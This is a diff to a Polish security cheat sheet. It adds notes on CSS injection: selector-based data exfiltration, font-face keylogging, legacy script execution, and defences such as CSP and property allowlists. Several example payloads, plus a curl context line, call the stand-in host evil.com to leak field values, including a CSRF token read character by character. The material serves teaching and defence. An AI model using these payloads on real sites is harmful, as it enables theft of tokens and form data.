@@ -47,10 +47,35 @@ curl -s "https://TARGET/page?css=input[value^='a']{background:url(http://evil.co
 
 > Źródło: OWASP CheatSheetSeries — Securing_Cascading_Style_Sheets_Cheat_Sheet.md
 
-- Waliduj CSS input — nie pozwalaj na user-controlled style attributes
-- Uzywaj CSP aby ograniczyc inline styles (`style-src` directive)
-- Sanityzuj wlasciwosci CSS — usun expression(), url(), import
-- Unikaj wstawiania user input do atrybutu style bezposrednio
+### CSS Injection — co jest mozliwe
+
+- **Data exfiltration via CSS selectors**: `input[value^="a"] { background: url(https://evil.com/a) }` — odczyt wartosci pol
+- **Keylogging via CSS**: font-face + unicode-range — wykrywanie wcisnietych klawiszy
+- **UI redressing**: zmiana wygladu strony, ukrywanie/wyswietlanie elementow
+- **JavaScript execution** (legacy): `expression()` (IE), `-moz-binding` (stary Firefox)
+
+### Niebezpieczne konstrukcje CSS
+
+- `expression()` — wykonuje JavaScript (tylko IE, ale testuj)
+- `url()` — laduje zewnetrzne zasoby (exfiltracja danych)
+- `@import` — laduje zewnetrzny CSS (injection zewnetrznego arkusza)
+- `behavior:` — laduje HTC files (IE)
+- `-moz-binding:` — laduje XBL (stary Firefox)
+
+### Obrona
+
+- **NIE wstawiaj user input** do atrybutu `style` ani do arkuszy CSS
+- **CSP `style-src`**: ogranicz zrodla CSS — `style-src 'self'` — blokuj inline styles jesli mozliwe
+- **Sanityzuj CSS**: usun `expression()`, `url()`, `@import`, `behavior:`, `-moz-binding:`
+- **Allowlist wlasciwosci CSS**: pozwol tylko na bezpieczne (color, font-size, margin) — denylist jest niewystarczajacy
+- **Uzywaj CSS classes** zamiast inline styles — latwe do kontrolowania
+
+### CSS Exfiltration — jak dziala
+
+- Atakujacy wstrzykuje CSS selector: `input[name="csrf"][value^="abc"] { background: url(evil.com/abc) }`
+- Przegladarka laduje URL gdy selector pasuje → atakujacy dowiaduje sie o wartosci pola
+- Iteracja po znakach: `value^="a"`, `value^="ab"`, `value^="abc"` → pelna wartosc
+- Obrona: nie pozwalaj na user-controlled CSS, uzywaj CSP
 
 ## ROZSZERZENIA BURP SUITE
 
